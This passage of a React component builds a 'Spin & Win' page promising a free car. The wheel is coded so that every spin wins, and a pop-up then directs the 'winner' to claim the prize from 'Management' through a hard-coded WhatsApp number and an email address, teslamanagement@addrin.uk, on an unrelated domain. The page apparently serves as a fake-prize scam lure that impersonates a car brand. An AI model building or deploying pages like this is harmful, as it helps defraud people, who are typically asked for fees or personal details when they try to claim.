    const winningIndex = availableIndices[randomIndex];
    
    const sliceAngle = 360 / cars.length;
    const targetAngle = 360 - (winningIndex * sliceAngle + sliceAngle / 2);
    
    // Increase spins for a longer duration
    const spins = 8;
    const currentRotation = rotation % 360;
    const newRotation = rotation + (spins * 360) + (targetAngle - currentRotation);
    
    setRotation(newRotation);
    
    // Increase timeout to match longer spin duration (8 seconds)
    setTimeout(() => {
      setIsSpinning(false);
      setWinner(cars[winningIndex]);
      setPreviousWinners(prev => new Set(prev).add(cars[winningIndex].id));
      
      // Trigger confetti celebration
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
        colors: ['#ef4444', '#3b82f6', '#a855f7', '#14b8a6', '#f97316', '#eab308']
      });
      
      // Show modal after confetti finishes
      setTimeout(() => {
        setShowModal(true);
      }, 3000);
    }, 8000);
  };

  const wheelColors = ['#ef4444', '#3b82f6', '#a855f7', '#14b8a6', '#6b7280', '#f97316'];
  const conicGradient = cars.map((car, i) => `${wheelColors[i]} ${i * 60}deg ${(i + 1) * 60}deg`).join(', ');

  return (
    <div className={`py-12 px-4 flex flex-col items-center justify-center rounded-3xl border ${isDark ? 'bg-[#0a0a0a] border-gray-800' : 'bg-white border-gray-200'} shadow-2xl relative overflow-hidden`}>
      <div className="text-center mb-10">
        <h2 className="text-4xl md:text-5xl font-black uppercase tracking-tight mb-4">Spin & Win</h2>
        <p className={`text-lg ${isDark ? 'text-gray-400' : 'text-gray-600'}`}>Test your luck! Spin the wheel for a chance to win a free car instantly.</p>
      </div>
      
      <div className={`relative w-80 h-80 md:w-96 md:h-96 mb-12 transition-transform duration-500 ${isSpinning ? 'scale-105' : 'scale-100'}`}>
        <div className={`absolute -top-6 left-1/2 -translate-x-1/2 z-20 text-6xl text-yellow-400 drop-shadow-lg transition-transform duration-300 ${isSpinning ? 'animate-bounce' : ''}`}>
          <i className="fas fa-caret-down"></i>
        </div>
        
        <motion.div 
          className={`w-full h-full rounded-full border-8 border-gray-800 relative overflow-hidden transition-shadow duration-500 ${isSpinning ? 'shadow-[0_0_60px_rgba(239,68,68,0.6)]' : 'shadow-2xl'}`}
          style={{ 
            background: `conic-gradient(${conicGradient})`
          }}
          initial={{ rotate: 0 }}
          animate={{ rotate: rotation }}
          transition={{ duration: 8, ease: [0.25, 1, 0.5, 1] }}
        >
          {cars.map((car, i) => {
            const angle = i * 60 + 30;
            return (
              <div 
                key={car.id} 
                className="absolute top-0 left-1/2 -translate-x-1/2 origin-bottom h-1/2 flex flex-col items-center justify-start pt-4 text-white font-bold text-xs md:text-sm drop-shadow-md w-24"
                style={{ transform: `rotate(${angle}deg)` }}
              >
                <div className="w-12 h-12 md:w-16 md:h-16 rounded-full overflow-hidden border-2 border-white/50 mb-1 shadow-inner bg-black/20">
                  <img src={car.image} alt={car.name} className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                </div>
                <span className="whitespace-nowrap text-center leading-tight">
                  {car.name}
                </span>
              </div>
            );
          })}
        </motion.div>
        
        {/* Center dot */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-8 h-8 rounded-full bg-gray-800 shadow-xl border-2 border-gray-600 z-10"></div>
      </div>
      
      <button 
        onClick={spin}
        disabled={isSpinning}
        className="bg-red-600 hover:bg-red-700 text-white font-black uppercase tracking-widest py-4 px-12 rounded-full shadow-xl shadow-red-900/40 hover:scale-105 active:scale-95 transition-all disabled:opacity-50 disabled:hover:scale-100 text-xl mb-6"
      >
        {isSpinning ? 'Spinning...' : 'SPIN NOW'}
      </button>
      
      <div className={`h-24 flex items-center justify-center transition-opacity duration-500 ${winner ? 'opacity-100' : 'opacity-0'}`}>
        {winner && (
          <div className="text-center animate-fadeIn">
            <h3 className="text-2xl font-bold text-green-500 mb-2">🎉 Congratulations! 🎉</h3>
            <p className="text-xl">You won a <span className="font-bold">{winner.name} {winner.model}</span>!</p>
          </div>
        )}
      </div>

      {/* Winner Claim Modal */}
      {showModal && winner && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-fadeIn" style={{ position: 'fixed' }}>
          <div className={`relative w-full max-w-md p-8 rounded-3xl shadow-2xl border ${isDark ? 'bg-[#111] border-gray-800' : 'bg-white border-gray-200'} text-center`}>
            <button 
              onClick={() => setShowModal(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-200 transition-colors"
            >
              <i className="fas fa-times text-xl"></i>
            </button>
            
            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-green-500/20 flex items-center justify-center">
              <i className="fas fa-trophy text-4xl text-green-500"></i>
            </div>
            
            <h3 className="text-3xl font-black mb-2 text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-emerald-600">
              YOU WON!
            </h3>
            
            <p className={`text-lg mb-6 ${isDark ? 'text-gray-300' : 'text-gray-600'}`}>
              Congratulations! You've won a <span className="font-bold text-red-500">{winner.name} {winner.model}</span>.
            </p>
            
            <div className="rounded-xl overflow-hidden mb-6 border-2 border-gray-800/50">
              <img src={winner.image} alt={winner.name} className="w-full h-40 object-cover" referrerPolicy="no-referrer" />
            </div>
            
            <p className={`text-sm mb-4 font-medium ${isDark ? 'text-gray-400' : 'text-gray-500'}`}>
              Contact Management to claim your prize:
            </p>
            
            <div className="flex flex-col gap-3">
              <a 
                href={`https://wa.me/447498713979?text=${encodeURIComponent(`Hello Management! I just spun the wheel and won a ${winner.name} ${winner.model}! How do I proceed to claim my prize?`)}`}
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-4 rounded-xl font-bold text-white bg-[#25D366] hover:bg-[#20bd5a] transition-colors flex items-center justify-center gap-2 shadow-lg shadow-green-900/20"
              >
                <i className="fab fa-whatsapp text-xl"></i>
                Claim via WhatsApp
              </a>
              
              <a 
                href={`mailto:teslamanagement@addrin.uk?subject=${encodeURIComponent(`Claiming my ${winner.name} ${winner.model}`)}&body=${encodeURIComponent(`Hello Management!\n\nI just spun the wheel on the Event Portal and won a ${winner.name} ${winner.model}!\n\nHow do I proceed to claim my prize?\n\nThank you!`)}`}
                className={`w-full py-4 rounded-xl font-bold transition-colors flex items-center justify-center gap-2 border ${isDark ? 'bg-gray-800 hover:bg-gray-700 border-gray-700 text-white' : 'bg-gray-100 hover:bg-gray-200 border-gray-300 text-gray-900'}`}
              >
                <i className="fas fa-envelope text-xl"></i>
                Claim via Email
              </a>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default function App() {
  const [isDark, setIsDark] = useState(true);
  return (
    <ThemeContext.Provider value={{ isDark, toggleTheme: () => setIsDark(!isDark) }}>
      <div className={isDark ? 'dark' : ''}>
         <style>{`
            @keyframes gradient-xy { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
            .animate-gradient-xy { background-size: 200% 200%; animation: gradient-xy 6s ease infinite; }
            .animate-fadeIn { animation: fadeIn 0.4s ease-out forwards; }
            .slider-thumb-custom { -webkit-appearance: none; height: 16px; width: 16px; background: #ef4444; border-radius: 50%; cursor: pointer; border: 2px solid white; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
            .custom-scrollbar::-webkit-scrollbar { height: 6px; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
         `}</style>
         <MainContent />
      </div>
    </ThemeContext.Provider>
  );
}